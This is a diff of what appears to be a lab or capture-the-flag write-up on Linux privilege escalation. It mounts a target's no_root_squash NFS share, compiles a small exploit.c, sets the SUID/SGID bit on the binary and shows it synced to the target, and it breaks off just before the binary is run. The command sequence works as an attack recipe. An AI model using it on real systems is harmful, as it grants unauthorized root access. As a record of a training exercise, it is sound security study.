@@ -681,12 +681,27 @@ Export list for 10.10.102.151:
 We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
 
 ```
-┌─[lnxuser@lnxhost]─[/tmp/attack]
-└──╼ $sudo mount -o rw 10.10.102.151:/home/backup .
+┌─[lnxuser@lnxhost]─[~]
+└──╼ $mkdir exploit
+┌─[lnxuser@lnxhost]─[~]
+└──╼ $sudo mount -o rw 10.10.102.151:/tmp exploit/
 ```
 
+After successful mounting it started syncing the file from target's `/tmp` folder to attacker's `~/exploits` folder.
+
 ```
-┌─[lnxuser@lnxhost]─[/tmp/attack]
+┌─[lnxuser@lnxhost]─[~/exploit]
+└──╼ $ls
+snap.lxd
+systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-logind.service-NSJhAh
+systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-resolved.service-8A9HVh
+systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-timesyncd.service-YeGiOf
+```
+
+Created exploit below which gives SUID and SGID permission. After compiling exploit.c I gave +s bit.
+
+```
+┌─[lnxuser@lnxhost]─[~/exploit]
 └──╼ $cat exploit.c 
 #include <unistd.h>  
 #include <stdlib.h>   
@@ -699,6 +714,10 @@ int main() {
 	return 0;
 
 }
+┌─[lnxuser@lnxhost]─[~/exploit]
+└──╼ $gcc exploit.c -o nfs -w
+┌─[lnxuser@lnxhost]─[~/exploit]
+└──╼ $chmod +s nfs 
 ```
 
 ```
@@ -712,3 +731,21 @@ total 36K
 -rw-r--r-- 1 lnxuser lnxuser 120 Nov 27 18:15 exploit.c
 -rwsr-sr-x 1 lnxuser lnxuser 16K Nov 27 18:15 nfs
 ```
+
+Above files are synced to target machine due to nfs.
+
+```
+$ ls -l
+total 40
+drwxrwxr-x 2 karen  karen  4096 Nov 27 12:36 attack
+-rw-r--r-- 1 ubuntu karen   120 Nov 27 12:59 exploit.c
+-rwsr-sr-x 1 ubuntu karen 16056 Nov 27 13:00 nfs
+drwx------ 3 root   root   4096 Nov 27 12:23 snap.lxd
+drwx------ 3 root   root   4096 Nov 27 12:23 systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-logind.service-NSJhAh
+drwx------ 3 root   root   4096 Nov 27 12:23 systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-resolved.service-8A9HVh
+drwx------ 3 root   root   4096 Nov 27 12:23 systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-timesyncd.service-YeGiOf
+```
+
+Executing the nfs file.
+
+
